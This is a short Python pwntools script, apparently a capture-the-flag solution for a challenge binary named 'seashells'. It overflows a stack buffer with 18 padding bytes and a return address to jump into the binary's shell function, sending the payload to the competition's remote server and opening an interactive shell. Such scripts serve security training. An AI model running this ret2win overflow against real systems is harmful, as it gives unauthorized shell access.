#!/usr/bin/env python2
from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./seashells")
    #ret2winaddr = p64(e.symbols["shell"])
    ret2winaddr = p64(0x4006e3)

    info("%#x target", e.symbols.shell)
    #io = process('./seashells')
    io = remote('p1.tjctf.org', 8009)
    #io = gdb.debug('./seashells', '''break *0x4006e1''')

    print(io.recvuntil('Would you like a shell?'))

    ''' Create buffer '''
    buf = "\x90" * 18

    io.sendline(buf + ret2winaddr + "\n")
    io.interactive()

if __name__ == '__main__':
    pwn()
